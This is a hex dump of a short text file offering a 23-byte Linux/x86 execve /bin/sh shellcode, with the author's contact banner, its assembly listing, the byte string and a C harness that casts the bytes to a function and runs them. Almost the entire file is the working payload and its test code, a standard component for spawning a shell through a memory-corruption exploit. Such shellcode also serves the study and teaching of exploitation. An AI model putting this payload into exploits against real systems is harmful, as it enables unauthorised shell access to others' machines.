00000000  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000030  2a 2a 2a 2a 2a 0d 0a 20  20 20 20 2a 20 20 20 20  |*****..    *    |
00000040  4c 69 6e 75 78 2f 78 38  36 20 65 78 65 63 76 65  |Linux/x86 execve|
00000050  20 2f 62 69 6e 2f 73 68  20 73 68 65 6c 6c 63 6f  | /bin/sh shellco|
00000060  64 65 20 32 33 20 62 79  74 65 73 20 20 20 20 2a  |de 23 bytes    *|
00000070  0d 0a 20 20 20 20 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |..    **********|
00000080  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000000a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 0d 0a 20 20 20  |***********..   |
000000b0  20 2a 09 20 20 09 20 20  41 75 74 68 6f 72 3a 20  | *.  .  Author: |
000000c0  48 61 6d 7a 61 20 4d 65  67 61 68 65 64 09 09 20  |Hamza Megahed.. |
000000d0  20 20 20 20 20 20 20 2a  0d 0a 20 20 20 20 2a 2a  |       *..    **|
000000e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000110  2a 2a 2a 0d 0a 20 20 20  20 2a 20 20 20 20 20 20  |***..    *      |
00000120  20 20 20 20 20 20 20 54  77 69 74 74 65 72 3a 20  |       Twitter: |
00000130  40 48 61 6d 7a 61 5f 4d  65 67 61 20 20 20 20 20  |@Hamza_Mega     |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000150  20 20 20 20 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |    ************|
00000160  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000180  2a 2a 2a 2a 2a 2a 2a 2a  2a 0d 0a 20 20 20 20 2a  |*********..    *|
00000190  20 20 20 20 20 62 6c 6f  67 3a 20 68 61 6d 7a 61  |     blog: hamza|
000001a0  2d 6d 65 67 61 5b 64 6f  74 5d 62 6c 6f 67 73 70  |-mega[dot]blogsp|
000001b0  6f 74 5b 64 6f 74 5d 63  6f 6d 20 20 20 20 20 20  |ot[dot]com      |
000001c0  20 20 20 2a 0d 0a 20 20  20 20 2a 2a 2a 2a 2a 2a  |   *..    ******|
000001d0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000001f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 0d  |***************.|
00000200  0a 20 20 20 20 2a 20 20  20 45 2d 6d 61 69 6c 3a  |.    *   E-mail:|
00000210  20 68 61 6d 7a 61 5b 64  6f 74 5d 6d 65 67 61 68  | hamza[dot]megah|
00000220  65 64 5b 61 74 5d 67 6d  61 69 6c 5b 64 6f 74 5d  |ed[at]gmail[dot]|
00000230  63 6f 6d 20 20 20 20 20  20 2a 0d 0a 20 20 20 20  |com      *..    |
00000240  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000270  2a 2a 2a 2a 2a 0d 0a 0d  0a 78 6f 72 20 20 20 20  |*****....xor    |
00000280  25 65 61 78 2c 25 65 61  78 0d 0a 70 75 73 68 20  |%eax,%eax..push |
00000290  20 20 25 65 61 78 0d 0a  70 75 73 68 20 20 20 24  |  %eax..push   $|
000002a0  30 78 36 38 37 33 32 66  32 66 0d 0a 70 75 73 68  |0x68732f2f..push|
000002b0  20 20 20 24 30 78 36 65  36 39 36 32 32 66 0d 0a  |   $0x6e69622f..|
000002c0  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 62 78  |mov    %esp,%ebx|
000002d0  0d 0a 70 75 73 68 20 20  20 25 65 61 78 0d 0a 70  |..push   %eax..p|
000002e0  75 73 68 20 20 20 25 65  62 78 0d 0a 6d 6f 76 20  |ush   %ebx..mov |
000002f0  20 20 20 25 65 73 70 2c  25 65 63 78 0d 0a 6d 6f  |   %esp,%ecx..mo|
00000300  76 20 20 20 20 24 30 78  62 2c 25 61 6c 0d 0a 69  |v    $0xb,%al..i|
00000310  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 0d 0a 2a  |nt    $0x80....*|
00000320  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
00000330  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 0d  |***************.|
00000340  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000350  2e 68 3e 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.h>..#include <s|
00000360  74 72 69 6e 67 2e 68 3e  0d 0a 20 0d 0a 63 68 61  |tring.h>.. ..cha|
00000370  72 20 2a 73 68 65 6c 6c  63 6f 64 65 20 3d 20 22  |r *shellcode = "|
00000380  5c 78 33 31 5c 78 63 30  5c 78 35 30 5c 78 36 38  |\x31\xc0\x50\x68|
00000390  5c 78 32 66 5c 78 32 66  5c 78 37 33 5c 78 36 38  |\x2f\x2f\x73\x68|
000003a0  5c 78 36 38 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\x68\x2f\x62\x69|
000003b0  22 0d 0a 09 09 20 20 22  5c 78 36 65 5c 78 38 39  |"....  "\x6e\x89|
000003c0  5c 78 65 33 5c 78 35 30  5c 78 35 33 5c 78 38 39  |\xe3\x50\x53\x89|
000003d0  5c 78 65 31 5c 78 62 30  5c 78 30 62 5c 78 63 64  |\xe1\xb0\x0b\xcd|
000003e0  5c 78 38 30 22 3b 0d 0a  0d 0a 69 6e 74 20 6d 61  |\x80";....int ma|
000003f0  69 6e 28 76 6f 69 64 29  0d 0a 7b 0d 0a 66 70 72  |in(void)..{..fpr|
00000400  69 6e 74 66 28 73 74 64  6f 75 74 2c 22 4c 65 6e  |intf(stdout,"Len|
00000410  67 74 68 3a 20 25 64 5c  6e 22 2c 73 74 72 6c 65  |gth: %d\n",strle|
00000420  6e 28 73 68 65 6c 6c 63  6f 64 65 29 29 3b 0d 0a  |n(shellcode));..|
00000430  28 2a 28 76 6f 69 64 28  2a 29 28 29 29 20 73 68  |(*(void(*)()) sh|
00000440  65 6c 6c 63 6f 64 65 29  28 29 3b 0d 0a 72 65 74  |ellcode)();..ret|
00000450  75 72 6e 20 30 3b 0d 0a  7d                       |urn 0;..}|
00000459
